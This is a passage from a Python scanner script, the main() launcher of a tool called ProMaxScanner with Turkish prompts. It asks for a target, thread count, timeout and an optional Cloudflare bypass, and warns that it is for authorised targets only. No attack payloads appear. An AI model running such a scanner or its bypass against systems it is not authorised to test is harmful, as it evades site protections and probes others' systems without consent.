    print(f"{R}UYARI: Sadece yetkili olduğun hedeflerde kullan.{N}\n")

    target = (sys.argv[1] if len(sys.argv) > 1 else input("Hedef: ")).strip()
    if not target: print("Hedef gerekli."); return

    try:
        bypass = input(f"{Y}Cloudflare bypass? (E/H) [{N}]: ").strip().upper() == "E"
    except EOFError: bypass = False
    if bypass and not CLOUDSCRAPER_AVAILABLE:
        print(f"{R}cloudscraper yok, kapalı{N}"); bypass = False

    try:
        w = input(f"{Y}Thread [{N}15{Y}]: {N}").strip()
        workers = max(1, min(80, int(w))) if w.isdigit() else 15
    except Exception: workers = 15

    try:
        tt = input(f"{Y}Timeout sn [{N}10{Y}]: {N}").strip()
        task_timeout = max(3, min(60, int(tt))) if tt.isdigit() else 10
    except Exception: task_timeout = 10

    scanner = None
    try:
        scanner = ProMaxScanner(target, bypass, workers=workers, rps=20, task_timeout=task_timeout)
        scanner.run()
    except KeyboardInterrupt:
        print(f"\n{Y}İptal.{N}")
    except Exception as e:
        import traceback
        print(f"\n{R}Hata: {e}{N}"); traceback.print_exc()
    finally:
        if scanner is not None:
            try: scanner.notifier.close()
            except Exception: pass
            try: scanner.logger.close()
            except Exception: pass

if __name__ == "__main__":
    main()
